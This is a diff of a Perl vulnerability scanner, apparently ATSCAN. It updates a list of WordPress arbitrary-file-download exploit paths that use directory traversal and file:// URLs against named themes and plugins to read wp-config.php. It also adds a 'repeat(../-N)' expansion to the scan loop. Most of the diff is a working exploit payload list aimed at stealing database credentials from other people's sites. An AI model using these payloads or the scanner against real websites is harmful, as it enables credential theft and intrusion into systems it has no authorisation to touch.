@@ -384,30 +384,31 @@ my @RFI=("/components/com_flyspray/startdown.php?file=", "/administrator/compone
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 #ADF WP WORDPRESS
-my @ADFWP=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
-"/wp-content/force-download.php?file=../wp-config.php",
-"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10",
+my @ADFWP=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=repeat(../-3)wp-config.php",
+"/wp-content/themes/ypo-theme/download.php?download=repeat(..%2F-3)wp-config.php",
+"/wp-content/force-download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=repeat(../-3)wp-config.php&file_size=10",
 "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
-"/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
-"/wp-content/themes/markant/download.php?file=../../wp-config.php",
-"/wp-content/themes/yakimabait/download.php?file=./wp-config.php",
-"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
-"/wp-content/themes/felis/download.php?file=../wp-config.php",
-"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
-"/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php",
+"/wp-content/themes/SMWF/inc/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/markant/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/yakimabait/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/TheLoft/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/felis/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/MichaelCanthony/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/trinity/lib/scripts/download.php?file=repeat(../-3)wp-config.php",
 "/wp-content/themes/epic/includes/download.php?file=wp-config.php",
-"/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php",
-"/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php",
-"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php",
-"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php",
-"/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
-"/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php",
-"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
+"/wp-content/themes/urbancity/lib/scripts/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/antioch/lib/scripts/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/authentic/includes/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/churchope/lib/downloadlink.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/lote27/download.php?download=repeat(../-3)wp-config.php",
+"/wp-content/themes/linenity/functions/download.php?imgurl=repeat(../-3)wp-config.php",
+"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=repeat(../-3)wp-config.php",
 "/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
 "/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
 "/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
-"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
-"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
+"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=repeat(../-3)wp-config.php");
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## ADMIN PAGE
@@ -1443,7 +1444,7 @@ sub doScan {
     for $rangQ(@rangQ) { $n++; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, scalar(grep { defined $_} @rangQ), $n); }
   }elsif ($URL1=~/repeat\((.*)\-(\d+)\)/) {
     $URL1=~s/repeat\((.*)\-(\d+)\)/ ATSCAN /g;
-    for($i=1;$i<=$2;$i++) { $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n); }
+    for($i=1;$i<=$2;$i++) { $n++; $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n); }
   }else{
     buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter);
   }
